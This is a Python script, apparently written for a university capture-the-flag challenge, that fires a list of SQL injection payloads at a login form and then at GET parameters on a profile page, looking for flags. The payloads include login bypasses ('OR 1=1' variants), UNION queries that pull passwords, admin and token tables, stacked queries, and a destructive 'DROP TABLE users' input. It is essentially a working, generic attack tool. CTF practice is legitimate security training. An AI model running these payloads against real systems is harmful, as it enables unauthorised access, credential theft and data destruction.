#!/usr/bin/env python3
"""
SQL Injection Exploit for Token Overflow Challenge

The hint "flag_is_in_the_database" suggests SQL injection.
The "token_overflow" might refer to overflowing SQL query logic.
"""

import requests
import re

BASE_URL = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"

def test_sql_injection(payload, description):
    """Test a SQL injection payload on the login form."""
    data = {'username': payload}
    
    try:
        response = requests.post(f"{BASE_URL}/login", data=data, timeout=5, allow_redirects=True)
        
        # Check for flags in response
        flags = re.findall(r'CTF\{[^}]+\}', response.text)
        
        # Check if we got different status or redirected to admin
        is_interesting = (
            response.status_code == 200 or
            '/admin' in response.url or
            'admin' in response.text.lower() or
            'welcome' in response.text.lower() or
            flags
        )
        
        if is_interesting:
            print(f"\n[+] Interesting response with payload: {description}")
            print(f"    Payload: {payload}")
            print(f"    Status: {response.status_code}")
            print(f"    Final URL: {response.url}")
            
            if flags:
                for flag in flags:
                    print(f"    ðŸš© FLAG: {flag}")
                return True, flags
            
            # Check for access granted indicators
            if 'access level' in response.text.lower():
                print(f"    [*] Response mentions 'access level'")
            if 'admin' in response.text.lower():
                print(f"    [*] Response mentions 'admin'")
                
        return False, []
        
    except Exception as e:
        print(f"[-] Error with {description}: {e}")
        return False, []


def main():
    print("="*70)
    print("SQL INJECTION EXPLOIT - TOKEN OVERFLOW CHALLENGE")
    print("="*70)
    print()
    print("[*] The hint 'flag_is_in_the_database' suggests SQL injection")
    print("[*] Testing various SQL injection payloads...")
    print()
    
    # SQL injection payloads
    payloads = [
        # Classic authentication bypass
        ("Classic bypass (OR 1=1)", "' OR '1'='1"),
        ("Classic bypass (OR 1=1 comment)", "' OR '1'='1'--"),
        ("Classic bypass (OR 1=1 hash)", "' OR '1'='1'#"),
        ("Admin OR 1=1", "admin' OR '1'='1"),
        ("Admin OR 1=1 comment", "admin' OR '1'='1'--"),
        
        # Always true conditions
        ("Always true (single quote)", "' OR 1=1--"),
        ("Always true (double dash)", "' OR 1=1#"),
        ("Always true (semicolon)", "' OR 1=1;--"),
        
        # Admin user targeting
        ("Admin user", "admin"),
        ("Admin with quote", "admin'--"),
        ("Admin bypass", "admin' OR 'a'='a"),
        
        # UNION-based injection
        ("UNION SELECT 1", "' UNION SELECT NULL--"),
        ("UNION SELECT flag", "' UNION SELECT flag FROM flags--"),
        ("UNION SELECT all", "' UNION SELECT * FROM flags--"),
        
        # Boolean-based
        ("Boolean true", "' OR 1=1 LIMIT 1--"),
        ("Boolean false then true", "' OR 'x'='x"),
        
        # Integer overflow in SQL context
        ("Integer overflow", "2147483647' OR '1'='1"),
        ("Negative integer", "-1' OR '1'='1"),
        
        # Comment variations
        ("Double dash comment", "admin'--"),
        ("Hash comment", "admin'#"),
        ("Slash star comment", "admin'/*"),
        
        # Special characters
        ("Semicolon bypass", "'; DROP TABLE users--"),
        ("Backtick", "`admin`"),
        
        # Try to extract from different tables
        ("Extract from users", "' OR 1=1 UNION SELECT password FROM users--"),
        ("Extract from admin", "' OR 1=1 UNION SELECT * FROM admin--"),
        ("Extract from tokens", "' OR 1=1 UNION SELECT * FROM tokens--"),
        
        # Stacked queries
        ("Stacked query", "admin'; SELECT * FROM flags--"),
    ]
    
    all_flags = []
    
    for description, payload in payloads:
        success, flags = test_sql_injection(payload, description)
        if success:
            all_flags.extend(flags)
    
    print("\n" + "="*70)
    print("RESULTS")
    print("="*70)
    
    if all_flags:
        print(f"\n[+] Found {len(set(all_flags))} unique flags:")
        for flag in set(all_flags):
            print(f"    ðŸš© {flag}")
    else:
        print("\n[-] No flags found through SQL injection")
        print("\n[*] Trying alternative approaches...")
        
        # Try GET parameter injection
        print("\n[*] Testing SQL injection via GET parameters...")
        params_to_test = ['id', 'user', 'username', 'token', 'session']
        
        for param in params_to_test:
            for desc, payload in payloads[:5]:  # Test first 5 payloads
                try:
                    url = f"{BASE_URL}/profile?{param}={payload}"
                    response = requests.get(url, timeout=5)
                    flags = re.findall(r'CTF\{[^}]+\}', response.text)
                    if flags and flags not in all_flags:
                        print(f"\n[+] Found via GET parameter {param}!")
                        print(f"    Payload: {payload}")
                        for flag in flags:
                            print(f"    ðŸš© {flag}")
                            all_flags.append(flag)
                except Exception:
                    pass


if __name__ == "__main__":
    main()
